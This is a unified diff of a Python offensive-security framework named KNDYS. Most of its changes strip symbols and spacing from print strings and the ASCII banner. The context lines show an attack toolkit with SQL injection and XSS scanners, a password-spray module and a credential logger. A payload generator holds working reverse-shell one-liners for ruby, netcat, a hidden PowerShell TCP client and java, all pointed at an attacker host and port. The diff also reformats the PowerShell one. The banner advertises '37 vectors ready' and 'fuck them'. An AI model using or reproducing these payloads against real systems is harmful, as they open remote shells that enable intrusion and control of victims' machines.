@@ -54,17 +54,17 @@ def check_and_install_dependencies():
             # Try regular pip install first
             cmd = [sys.executable, '-m', 'pip', 'install', '--quiet'] + missing_packages
             subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print(f"\033[0;32m[✓] All dependencies installed successfully!\033[0m\n")
+            print(f"\033[0;32m[] All dependencies installed successfully!\033[0m\n")
         except subprocess.CalledProcessError:
             # If that fails, try with --break-system-packages for modern systems
             try:
                 cmd = [sys.executable, '-m', 'pip', 'install', '--break-system-packages', '--quiet'] + missing_packages
                 subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                print(f"\033[0;32m[✓] All dependencies installed successfully!\033[0m\n")
+                print(f"\033[0;32m[] All dependencies installed successfully!\033[0m\n")
             except subprocess.CalledProcessError as e:
-                print(f"\033[0;31m[✗] Auto-install failed. Please run manually:\033[0m")
-                print(f"\033[0;36m    pip3 install {' '.join(missing_packages)}\033[0m")
-                print(f"\033[0;33m    Or with: pip3 install --break-system-packages {' '.join(missing_packages)}\033[0m\n")
+                print(f"\033[0;31m[] Auto-install failed. Please run manually:\033[0m")
+                print(f"\033[0;36m pip3 install {' '.join(missing_packages)}\033[0m")
+                print(f"\033[0;33m Or with: pip3 install --break-system-packages {' '.join(missing_packages)}\033[0m\n")
                 sys.exit(1)
 
 # Run dependency check on first import
@@ -234,23 +234,23 @@ except ImportError:
 BANNER = f"""
 {Fore.MAGENTA}{Style.BRIGHT}
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃  ██╗  ██╗███╗   ██╗██████╗ ██╗   ██╗ ███████╗ {Fore.CYAN}{Style.BRIGHT} OFFENSIVE SYSTEM{Fore.MAGENTA}{Style.BRIGHT}     ┃
-┃  ██║ ██╔╝████╗  ██║██╔══██╗╚██╗ ██╔╝ ██╔════╝ {Fore.CYAN}{Style.BRIGHT}signal console online{Fore.MAGENTA}{Style.BRIGHT} ┃
-┃  █████╔╝ ██╔██╗ ██║██║  ██║ ╚████╔╝  ███████╗                       ┃
-┃  ██╔═██╗ ██║╚██╗██║██║  ██║  ╚██╔╝   ╚════██║                       ┃
-┃  ██║  ██╗██║ ╚████║██████╔╝   ██║    ███████║                       ┃
-┃  ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝    ╚══════╝                       ┃
+┃ ██╗ ██╗███╗ ██╗██████╗ ██╗ ██╗ ███████╗ {Fore.CYAN}{Style.BRIGHT} OFFENSIVE SYSTEM{Fore.MAGENTA}{Style.BRIGHT} ┃
+┃ ██║ ██╔╝████╗ ██║██╔══██╗╚██╗ ██╔╝ ██╔════╝ {Fore.CYAN}{Style.BRIGHT}signal console online{Fore.MAGENTA}{Style.BRIGHT} ┃
+┃ █████╔╝ ██╔██╗ ██║██║ ██║ ╚████╔╝ ███████╗ ┃
+┃ ██╔═██╗ ██║╚██╗██║██║ ██║ ╚██╔╝ ╚════██║ ┃
+┃ ██║ ██╗██║ ╚████║██████╔╝ ██║ ███████║ ┃
+┃ ╚═╝ ╚═╝╚═╝ ╚═══╝╚═════╝ ╚═╝ ╚══════╝ ┃
 ┣━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ SIGNAL FEED  ┃ core.grid = SYNCHRONIZED                             ┃
-┃              ┃ type = LOW_PROFILE                                   ┃
-┃              ┃ payload.bank = 37 vectors ready                      ┃
+┃ SIGNAL FEED ┃ core.grid = SYNCHRONIZED ┃
+┃ ┃ type = LOW_PROFILE ┃
+┃ ┃ payload.bank = 37 vectors ready ┃
 ┣━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ TERMINAL     ┃ Aida will judge you,                                 ┃
-┃              ┃ You will scare them,                                 ┃
-┃ TELEMETRY    ┃ And i will vanish.                                   ┃
-┃              ┃ Go for it                                            ┃
+┃ TERMINAL ┃ Aida will judge you, ┃
+┃ ┃ You will scare them, ┃
+┃ TELEMETRY ┃ And i will vanish. ┃
+┃ ┃ Go for it ┃
 ┣━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ VECTORS      ┃ fuck them                                            ┃
+┃ VECTORS ┃ fuck them ┃
 ┗━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 {Style.RESET_ALL}"""
 
@@ -294,7 +294,7 @@ class InputValidator:
         sanitized = cmd
         for char in dangerous:
             if char in sanitized:
-                return None  # Reject dangerous commands
+                return None # Reject dangerous commands
         return sanitized
     
     @staticmethod
@@ -1218,7 +1218,7 @@ class SessionManager:
     
     def __init__(self):
         self.sessions = {}
-        self.session_timeout = 3600  # 1 hour
+        self.session_timeout = 3600 # 1 hour
         self.lock = threading.Lock()
     
     def create_session(self, session_id, data=None):
@@ -1654,19 +1654,19 @@ class AdvancedSQLiScanner:
         print(f"{Fore.CYAN}SQL INJECTION SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Payloads tested : {Fore.CYAN}{min(self.plan_size, self.profile['max_total_payloads'])}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Findings        : {Fore.GREEN}{len(self.findings)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Errors          : {Fore.YELLOW}{len(self.errors)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Duration        : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(self.findings)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(self.errors)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
         if self.findings:
             print(f"\n{Fore.GREEN}[+] Top Findings{Style.RESET_ALL}")
             for finding in self.findings[:5]:
                 dbms = f" ({finding.dbms})" if finding.dbms else ''
-                print(f"  {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} {finding.parameter} via {finding.technique}{dbms} – {finding.evidence}")
+                print(f" {Fore.YELLOW}{finding.severity:<8}{Style.RESET_ALL} {finding.parameter} via {finding.technique}{dbms} – {finding.evidence}")
         report_paths = self._export_results(duration)
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"  • {path}")
+                print(f" • {path}")
 
     def _export_results(self, duration):
         timestamp = int(time.time())
@@ -2016,7 +2016,7 @@ class XSSBeaconHandler(BaseHTTPRequestHandler):
         self._record_event()
 
     def log_message(self, format, *args):
-        return  # Silence default logging
+        return # Silence default logging
 
     def _record_event(self):
         parsed = urlparse(self.path)
@@ -3199,7 +3199,7 @@ class Logger:
     def __init__(self):
         self.log_file = f"kndys_session_{int(time.time())}.log"
         self.session_file = f"kndys_session_{int(time.time())}.json"
-        self.max_log_size = 10 * 1024 * 1024  # 10MB
+        self.max_log_size = 10 * 1024 * 1024 # 10MB
         self.lock = threading.Lock()
         
         # Setup Python logging
@@ -3264,7 +3264,7 @@ class Logger:
                 
             session_data["actions"].append({
                 "timestamp": datetime.now().isoformat(),
-                "data": str(data)[:1000]  # Limit data size
+                "data": str(data)[:1000] # Limit data size
             })
             
             with open(self.session_file, 'w', encoding='utf-8') as f:
@@ -3305,7 +3305,7 @@ class Logger:
             session_data["credentials"].append({
                 "timestamp": datetime.now().isoformat(),
                 "username": username,
-                "password": hashlib.sha256(password.encode()).hexdigest(),  # Hash for security
+                "password": hashlib.sha256(password.encode()).hexdigest(), # Hash for security
                 "source": source
             })
             
@@ -3418,7 +3418,7 @@ class PayloadGenerator:
                 "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                 "nc": "nc -e /bin/sh {LHOST} {LPORT}",
                 "nc_traditional": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
-                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
+                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
                 "java": """java -e 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}} catch (Exception e){{}} }};p.destroy();s.close();'"""
             },
             
@@ -3535,7 +3535,7 @@ class KNDYSFramework:
         """Background thread for cleanup tasks"""
         while True:
             try:
-                time.sleep(300)  # Every 5 minutes
+                time.sleep(300) # Every 5 minutes
                 self.session_manager.cleanup_expired()
                 self.logger.log("Background cleanup completed", "DEBUG")
             except Exception as e:
@@ -3559,8 +3559,8 @@ class KNDYSFramework:
         os.system('cls' if os.name == 'nt' else 'clear')
         print(BANNER)
         print(f"{Fore.CYAN}{Style.BRIGHT}┏━━ RAPID OPS ━━┓{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}┃ {Fore.GREEN}help{Fore.WHITE}          // decode full command index{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}┃ {Fore.GREEN}show modules{Fore.WHITE}  // enumerate offensive vectors{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}┃ {Fore.GREEN}help{Fore.WHITE} // decode full command index{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}┃ {Fore.GREEN}show modules{Fore.WHITE} // enumerate offensive vectors{Style.RESET_ALL}")
         print(f"{Fore.CYAN}┃ {Fore.GREEN}show wordlists{Fore.WHITE} // sync credential arsenals{Style.RESET_ALL}")
         print(f"{Fore.CYAN}┗{'━'*32}{Style.RESET_ALL}\n")
 
@@ -3577,7 +3577,7 @@ class KNDYSFramework:
         if missing:
             print(f"{Fore.RED}{Style.BRIGHT}┏━━ OPTIONAL TOOLCHAIN OFFLINE ━━┓{Style.RESET_ALL}")
             print(f"{Fore.RED}┃ Missing :: {Fore.WHITE}{', '.join(missing)}{Style.RESET_ALL}")
-            print(f"{Fore.RED}┃ Remedy  :: {Fore.GREEN}pip install {' '.join(missing)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}┃ Remedy :: {Fore.GREEN}pip install {' '.join(missing)}{Style.RESET_ALL}")
             print(f"{Fore.RED}┗{'━'*44}{Style.RESET_ALL}\n")
     
     def initialize_modules(self):
@@ -3626,7 +3626,7 @@ class KNDYSFramework:
                     'description': 'Network discovery and mapping',
                     'options': {
                         'network': '192.168.1.0/24',
-                        'scan_type': 'ping',  # ping, tcp, udp, all
+                        'scan_type': 'ping', # ping, tcp, udp, all
                         'timeout': '1',
                         'resolve_hostnames': 'true',
                         'detect_os': 'true',
@@ -3642,7 +3642,7 @@ class KNDYSFramework:
                         'deep_scan': 'false',
                         'port_scan': 'true',
                         'banner_grab': 'true',
-                        'timing': 'normal',  # fast, normal, slow
+                        'timing': 'normal', # fast, normal, slow
                         'custom_ports': '',
                         'max_ports': '60'
                     }
@@ -3655,7 +3655,7 @@ class KNDYSFramework:
                     'description': 'Comprehensive vulnerability scanner with 33 checks',
                     'options': {
                         'target': 'http://example.com',
-                        'scan_type': 'full',  # quick, web, api, full
+                        'scan_type': 'full', # quick, web, api, full
                         'threads': '5',
                         'depth': '2',
                         'aggressive': 'false',
@@ -3674,14 +3674,14 @@ class KNDYSFramework:
                     'description': 'Cross-Site Scripting vulnerability scanner',
                     'options': {
                         'url': 'http://example.com',
-                        'method': 'auto',  # get, post, both, auto
+                        'method': 'auto', # get, post, both, auto
                         'parameters': 'auto',
-                        'scope': 'single',  # single, host, crawl
+                        'scope': 'single', # single, host, crawl
                         'crawl_depth': '2',
                         'max_pages': '15',
                         'max_parameters': '40',
                         'threads': '12',
-                        'mode': 'balanced',  # fast, balanced, deep
+                        'mode': 'balanced', # fast, balanced, deep
                         'timeout': '8',
                         'include_forms': 'true',
                         'include_dom': 'true',
@@ -3697,12 +3697,12 @@ class KNDYSFramework:
                     'description': 'Adaptive CSRF protection analyzer',
                     'options': {
                         'url': 'http://example.com',
-                        'scope': 'single',  # single, host, crawl
-                        'mode': 'balanced',  # fast, balanced, deep
+                        'scope': 'single', # single, host, crawl
+                        'mode': 'balanced', # fast, balanced, deep
                         'crawl_depth': '2',
                         'max_pages': '12',
                         'form_limit': '40',
-                        'method_filter': 'all',  # post, get, all
+                        'method_filter': 'all', # post, get, all
                         'threads': '8',
                         'timeout': '8',
                         'rate_limit': '0',
@@ -3720,7 +3720,7 @@ class KNDYSFramework:
                     'description': 'Adaptive SSL/TLS analyzer',
                     'options': {
                         'target': 'example.com:443',
-                        'mode': 'balanced',  # fast, balanced, deep
+                        'mode': 'balanced', # fast, balanced, deep
                         'protocol_scan': 'true',
                         'cipher_scan': 'true',
                         'http_headers': 'true',
@@ -4883,7 +4883,7 @@ class KNDYSFramework:
         catalog = self.wordlists.get('wordlist_catalog', [])
 
         if not catalog:
-            print(f"{Fore.YELLOW}⚠  No wordlist catalog entries found{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW} No wordlist catalog entries found{Style.RESET_ALL}")
             return
 
         grouped = {}
@@ -4903,46 +4903,46 @@ class KNDYSFramework:
                 aliases = ', '.join(sorted(set(entry['aliases']), key=lambda a: (len(a), a))[:3])
                 print(
                     f"{Fore.WHITE}│ {status_icon} {Fore.YELLOW}{entry['name']:<32}{Fore.WHITE}[{entry['size']}]"
-                    f"  {Fore.BLUE}{entry['description']}{Style.RESET_ALL}"
+                    f" {Fore.BLUE}{entry['description']}{Style.RESET_ALL}"
                 )
-                print(f"{Fore.WHITE}│    aliases :: {Fore.CYAN}{aliases}{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}│ aliases :: {Fore.CYAN}{aliases}{Style.RESET_ALL}")
                 source_line = 'bundled with KNDYS' if entry.get('bundled') else entry['url']
-                print(f"{Fore.WHITE}│    source  :: {Fore.GREEN}{source_line}{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}│ source :: {Fore.GREEN}{source_line}{Style.RESET_ALL}")
             print(f"{Fore.CYAN}└{'─'*68}{Style.RESET_ALL}\n")
 
         print(f"{Fore.CYAN}▸ sync :: {Fore.GREEN}download wordlist <alias>{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}▸ op   :: {Fore.GREEN}use password/spray_attack → set usernames/passwords{Style.RESET_ALL}\n")
+        print(f"{Fore.CYAN}▸ op :: {Fore.GREEN}use password/spray_attack → set usernames/passwords{Style.RESET_ALL}\n")
 
     def download_wordlist(self, name):
         """Download and prepare a wordlist (passwords, usernames, or credentials)"""
         entry = self.find_wordlist_entry(name)
 
         if not entry:
-            print(f"{Fore.RED}✗ Unknown wordlist: {Fore.WHITE}{name}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}show wordlists{Fore.BLUE} to see available lists{Style.RESET_ALL}")
+            print(f"{Fore.RED} Unknown wordlist: {Fore.WHITE}{name}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}show wordlists{Fore.BLUE} to see available lists{Style.RESET_ALL}")
             return
 
         if entry.get('bundled'):
             if entry['path'].exists():
-                print(f"{Fore.GREEN}✓ Bundled wordlist available locally{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}  → {entry['path']}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} Bundled wordlist available locally{Style.RESET_ALL}")
+                print(f"{Fore.CYAN} → {entry['path']}{Style.RESET_ALL}")
             else:
                 print(f"{Fore.RED}[!] Bundled wordlist missing: {entry['name']}{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Ensure repository assets under 'wordlists/' are intact.{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Ensure repository assets under 'wordlists/' are intact.{Style.RESET_ALL}")
             entry['available'] = entry['path'].exists()
             return
 
         if entry['path'].exists():
-            print(f"{Fore.GREEN}✓ Wordlist already available{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}  → {entry['path']}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN} Wordlist already available{Style.RESET_ALL}")
+            print(f"{Fore.CYAN} → {entry['path']}{Style.RESET_ALL}")
             entry['available'] = True
             return
 
         print(f"\n{Fore.CYAN}┌─[ DOWNLOAD INFO ]──────────────────────────────{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}│ Name    : {Fore.YELLOW}{entry['name']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}│ Type    : {Fore.MAGENTA}{entry['category'].upper()}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}│ Size    : {Fore.CYAN}{entry['size']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}│ Source  : {Fore.BLUE}{entry['url'][:50]}...{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}│ Name : {Fore.YELLOW}{entry['name']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}│ Type : {Fore.MAGENTA}{entry['category'].upper()}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}│ Size : {Fore.CYAN}{entry['size']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}│ Source : {Fore.BLUE}{entry['url'][:50]}...{Style.RESET_ALL}")
         print(f"{Fore.CYAN}└────────────────────────────────────────────────{Style.RESET_ALL}\n")
 
         confirm = input(f"{Fore.YELLOW}Download now? (y/N): {Style.RESET_ALL}").strip().lower()
@@ -4969,7 +4969,7 @@ class KNDYSFramework:
                         if total_size > 0:
                             percent = (downloaded / total_size) * 100
                             print(f"\r{Fore.CYAN}⟳ Progress: {percent:.1f}% ({downloaded // (1024*1024)}MB / {total_size // (1024*1024)}MB){Style.RESET_ALL}", end='')
-            print()  # New line after progress
+            print() # New line after progress
 
             compressed = entry.get('compressed')
 
@@ -5009,18 +5009,18 @@ class KNDYSFramework:
 
             if entry['available']:
                 file_size = entry['path'].stat().st_size / (1024 * 1024)
-                print(f"{Fore.GREEN}✓ Download complete!{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}  → Location: {Fore.WHITE}{entry['path']}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}  → Size: {Fore.WHITE}{file_size:.1f} MB{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Ready to use with alias: {Fore.GREEN}{entry['aliases'][0]}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} Download complete!{Style.RESET_ALL}")
+                print(f"{Fore.CYAN} → Location: {Fore.WHITE}{entry['path']}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN} → Size: {Fore.WHITE}{file_size:.1f} MB{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Ready to use with alias: {Fore.GREEN}{entry['aliases'][0]}{Style.RESET_ALL}")
                 if entry['category'] in self.master_wordlists:
                     self._rebuild_master_wordlists([entry['category']])
             else:
-                print(f"{Fore.YELLOW}⚠  Download completed but file not accessible{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW} Download completed but file not accessible{Style.RESET_ALL}")
 
         except Exception as e:
-            print(f"\n{Fore.RED}✗ Download failed: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Check your internet connection and try again{Style.RESET_ALL}")
+            print(f"\n{Fore.RED} Download failed: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Check your internet connection and try again{Style.RESET_ALL}")
         finally:
             if cleanup_tmp and tmp_path.exists():
                 try:
@@ -5073,14 +5073,14 @@ class KNDYSFramework:
                     break
         
         if not category or not module_name:
-            print(f"{Fore.RED}✗ Module not found: {Fore.WHITE}{module_path}{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}show modules{Fore.BLUE} to list available modules{Style.RESET_ALL}")
+            print(f"{Fore.RED} Module not found: {Fore.WHITE}{module_path}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}show modules{Fore.BLUE} to list available modules{Style.RESET_ALL}")
             return False
         
         self.current_module = f"{category}/{module_name}"
         self.module_options = self.modules[category][module_name]['options'].copy()
         
-        print(f"{Fore.GREEN}✓ Module loaded: {Fore.CYAN}{self.current_module}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN} Module loaded: {Fore.CYAN}{self.current_module}{Style.RESET_ALL}")
         print(f"{Fore.BLUE}→ {self.modules[category][module_name]['description']}{Style.RESET_ALL}")
         
         self.show_options()
@@ -5089,7 +5089,7 @@ class KNDYSFramework:
     def show_options(self):
         """Show current module options"""
         if not self.current_module:
-            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
+            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
             return
 
         self._render_screen_header(
@@ -5110,23 +5110,23 @@ class KNDYSFramework:
     def set_option(self, option, value):
         """Set module option with validation"""
         if not self.current_module:
-            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
+            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
             return
         
         if option not in self.module_options:
-            print(f"{Fore.RED}✗ Invalid option: {Fore.WHITE}{option}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Invalid option: {Fore.WHITE}{option}{Style.RESET_ALL}")
             available = ', '.join(list(self.module_options.keys())[:5])
-            print(f"{Fore.BLUE}ℹ  Available options: {Fore.CYAN}{available}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Available options: {Fore.CYAN}{available}{Style.RESET_ALL}")
             return
         
         # Validate input based on option type
         validated_value = self._validate_option_value(option, value)
         if validated_value is None:
-            print(f"{Fore.RED}✗ Invalid value for {option}: {value}{Style.RESET_ALL}")
+            print(f"{Fore.RED} Invalid value for {option}: {value}{Style.RESET_ALL}")
             return
         
         self.module_options[option] = validated_value
-        print(f"{Fore.GREEN}✓ {option} {Fore.WHITE}→ {Fore.CYAN}{validated_value}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN} {option} {Fore.WHITE}→ {Fore.CYAN}{validated_value}{Style.RESET_ALL}")
     
     def _validate_option_value(self, option, value):
         """Validate option value based on type"""
@@ -5199,12 +5199,12 @@ class KNDYSFramework:
     def run_module(self):
         """Execute the current module"""
         if not self.current_module:
-            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}use <module>{Fore.BLUE} to select a module{Style.RESET_ALL}")
+            print(f"{Fore.RED} No module selected{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Use {Fore.CYAN}use <module>{Fore.BLUE} to select a module{Style.RESET_ALL}")
             return
         
         print(f"\n{Fore.CYAN}{'═'*50}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}⚡ Executing: {Fore.WHITE}{self.current_module}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} Executing: {Fore.WHITE}{self.current_module}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*50}{Style.RESET_ALL}\n")
         self.logger.log(f"Running module: {self.current_module}")
         
@@ -5297,7 +5297,7 @@ class KNDYSFramework:
                 module_handlers[module_name]()
                 elapsed = time.time() - start_time
                 
-                print(f"\n{Fore.GREEN}✓ Module completed in {elapsed:.2f}s{Style.RESET_ALL}")
+                print(f"\n{Fore.GREEN} Module completed in {elapsed:.2f}s{Style.RESET_ALL}")
                 self.logger.log(f"Module {module_name} completed successfully", "INFO")
                 
             except KeyboardInterrupt:
@@ -5312,7 +5312,7 @@ class KNDYSFramework:
                 
             except PermissionError as e:
                 self.error_handler.handle_error(e, f"Permission denied in {module_name}")
-                print(f"{Fore.BLUE}ℹ  Try running with sudo/administrator privileges{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Try running with sudo/administrator privileges{Style.RESET_ALL}")
                 
             except ValueError as e:
                 self.error_handler.handle_error(e, f"Invalid value in {module_name}")
@@ -5335,14 +5335,14 @@ class KNDYSFramework:
         aggressive = self.module_options.get('aggressive', 'false').lower() == 'true'
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║        PROFESSIONAL PORT SCANNER - KNDYS         ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ PROFESSIONAL PORT SCANNER - KNDYS ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
-        print(f"{Fore.WHITE}Target:{Style.RESET_ALL}     {Fore.CYAN}{target}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}Ports:{Style.RESET_ALL}      {Fore.CYAN}{ports_range}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}Scan Type:{Style.RESET_ALL}  {Fore.CYAN}{scan_type}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL}    {Fore.CYAN}{threads}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}Timeout:{Style.RESET_ALL}    {Fore.CYAN}{timeout}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Target:{Style.RESET_ALL} {Fore.CYAN}{target}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Ports:{Style.RESET_ALL} {Fore.CYAN}{ports_range}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Scan Type:{Style.RESET_ALL} {Fore.CYAN}{scan_type}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL} {Fore.CYAN}{threads}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Timeout:{Style.RESET_ALL} {Fore.CYAN}{timeout}s{Style.RESET_ALL}")
         print(f"{Fore.WHITE}Aggressive:{Style.RESET_ALL} {Fore.CYAN}{aggressive}{Style.RESET_ALL}\n")
         
         # Parse ports
@@ -5414,7 +5414,7 @@ class KNDYSFramework:
             
             if aggressive:
                 try:
-                    if port == 21:  # FTP Anonymous
+                    if port == 21: # FTP Anonymous
                         test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         test_sock.settimeout(timeout)
                         test_sock.connect((target, port))
@@ -5424,7 +5424,7 @@ class KNDYSFramework:
                         if '230' in response or '331' in response:
                             vulns.append({'type': 'FTP Anonymous', 'severity': 'HIGH', 'description': 'FTP allows anonymous login'})
                         test_sock.close()
-                    elif port == 6379:  # Redis no auth
+                    elif port == 6379: # Redis no auth
                         test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         test_sock.settimeout(timeout)
                         test_sock.connect((target, port))
@@ -5433,9 +5433,9 @@ class KNDYSFramework:
                         if 'redis_version' in response:
                             vulns.append({'type': 'Redis Unprotected', 'severity': 'CRITICAL', 'description': 'Redis without authentication'})
                         test_sock.close()
-                    elif port == 27017:  # MongoDB
+                    elif port == 27017: # MongoDB
                         vulns.append({'type': 'MongoDB Exposed', 'severity': 'HIGH', 'description': 'MongoDB port publicly accessible'})
-                    elif port == 9200:  # Elasticsearch
+                    elif port == 9200: # Elasticsearch
                         vulns.append({'type': 'Elasticsearch Open', 'severity': 'HIGH', 'description': 'Elasticsearch without authentication'})
                 except:
                     pass
@@ -5461,7 +5461,7 @@ class KNDYSFramework:
             return port, False, {}, '', []
         
         # Execute scan
-        print(f"{Fore.BLUE}⚡ Starting advanced port scan...{Style.RESET_ALL}")
+        print(f"{Fore.BLUE} Starting advanced port scan...{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}\n")
         
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
@@ -5477,18 +5477,18 @@ class KNDYSFramework:
                         'vulnerabilities': vulns
                     }
                     
-                    print(f"{Fore.GREEN}✓ {port:>5}/TCP {Fore.CYAN}OPEN  {Fore.WHITE}→ {service_name}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN} {port:>5}/TCP {Fore.CYAN}OPEN {Fore.WHITE}→ {service_name}{Style.RESET_ALL}")
                     
                     if banner_info.get('version'):
